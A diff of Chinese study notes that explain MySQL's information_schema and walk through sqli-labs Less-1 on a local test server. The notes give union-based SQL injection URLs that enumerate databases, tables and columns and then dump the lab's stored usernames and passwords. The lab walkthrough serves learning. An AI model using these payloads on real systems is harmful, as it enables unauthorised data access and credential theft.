@@ -1,4 +1,4 @@
-## SQL 基础复习
+## SQL 基础知识复习
 
 为了在 SQL 注入时，编写 SQL 的过程中不磕磕巴巴，来复习下在 SQL 注入中常见的 SQL 基础知识吧～
 
@@ -207,6 +207,78 @@ FROM table2
 
 
 
+### ⭐️数据表 information_schema
+
+`INFORMATION_SCHEMA` 是 SQL 标准中定义的一个特殊系统数据库（或模式），提供关于数据库结构的**元信息**，它是数据库的**数据字典**，存储了数据库的表、列、索引、约束、用户权限等信息 .
+
+#### 特点
+
+* **只读性**：INFORMATION_SCHEMA 仅用于查询，不能对其内容进行修改
+* **跨数据库兼容**：SQL 标准的一部分，大多数主流数据库（如 MySQL、PostgreSQL、SQL Server、MariaDB）都支持
+* **系统表集合**：包含一系列表，每个表存储不同类别的元数据
+
+#### 常用表及其作用
+
+一. **TABLES 表**：表的基本信息，包含数据库中所有表的信息，关键列如下所示：
+
+* TABLE_SCHEMA：表所在的数据库名
+
+* TABLE_NAME：表名
+
+* TABLE_TYPE：表类型（如 BASE TABLE、VIEW）
+
+* ENGINE：存储引擎（MySQL 专用）
+
+  ```sql
+  -- 根据数据库名，查询所有表名
+  SELECT TABLE_NAME
+  FROM INFORMATION_SCHEMA.TABLES
+  WHERE TABLE_SCHEMA = 'your_database_name';
+  ```
+
+二. **COLUMNS 表**：列的详细信息，包含表中所有列的信息，关键列如下所示：
+
+* TABLE_SCHEMA：表所在的数据库名
+
+* TABLE_NAME：表名
+
+* COLUMN_NAME：列名
+
+* DATA_TYPE：数据类型
+
+* IS_NULLABLE：是否允许 NULL 值
+
+  ```sql
+  -- 根据数据库名及表名，查询指定表的列信息
+  SELECT COLUMN_NAME, DATA_TYPE, IS_NULLABLE
+  FROM INFORMATION_SCHEMA.COLUMNS
+  WHERE TABLE_SCHEMA = 'your_database_name' AND TABLE_NAME = 'your_table_name';
+  ```
+
+三.  **SCHEMATA 表**：数据库信息，包含当前服务器上的所有数据库信息，关键列如下所示：
+
+* SCHEMA_NAME：数据库名
+
+  ```sql
+  -- 列出所有数据库名
+  SELECT SCHEMA_NAME
+  FROM INFORMATION_SCHEMA.SCHEMATA;
+  ```
+
+
+
+### 常用的系统函数
+
+pass...
+
+
+
+### 常用的字符串链接函数
+
+pass...
+
+
+
 ## 注入类型总结
 
 以下是常见的 SQL 注入类型及其特点的总结：
@@ -293,7 +365,7 @@ FROM table2
 
 
 
-## 第一关
+## 🎉第一关
 
 ### 源代码分析
 
@@ -449,7 +521,18 @@ Your Login name:2
 Your Password:security
 ```
 
-五. 接着我们结合 `group_concat()` 函数，获取数据库 `security` 中所有的表信息：
+值得注意的是，如果你想要获取所有数据库的名称，可以结合数据库 `information_schema` 与函数 `group_concat()` 来做到这一点：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(schema_name) from information_schema.schemata--+
+```
+
+```sql
+Your Login name:2
+Your Password:information_schema,challenges,mysql,performance_schema,security
+```
+
+五. 接着我们继续结合数据库 `information_schema` 与函数 `group_concat()`，获取数据库 `security` 中所有的表信息：
 
 ```sql
 http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(table_name) from information_schema.`tables` where table_schema='security'; --+
@@ -466,4 +549,26 @@ Your Login name:user_name_demo
 Your Password:emails,referers,uagents,users
 ```
 
-...pass
+六. 根据表名获取表中的列信息：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users'--+
+```
+
+```
+Your Login name:2
+Your Password:id,username,password
+```
+
+七. 最后根据表名及其列信息，来获取我们想要的数据，这里为了优雅滴😅展示用户名与密码的对应关系，额外利用了函数 `concat_ws()`：
+
+```sql
+http://localhost:8001/Less-1/?id=-1' union select 1,2,group_concat(concat_ws(' : ', username,password)) from users--+
+```
+
+```
+Your Login name:2
+Your Password:Dumb : Dumb,Angelina : I-kill-you,Dummy : p@ssword,secure : crappy,stupid : stupidity,superman : genious,batman : mob!le,admin : admin,admin1 : admin1,admin2 : admin2,admin3 : admin3,dhakkan : dumbo,admin4 : admin4
+```
+
+🎉到此第一关就通关喽～
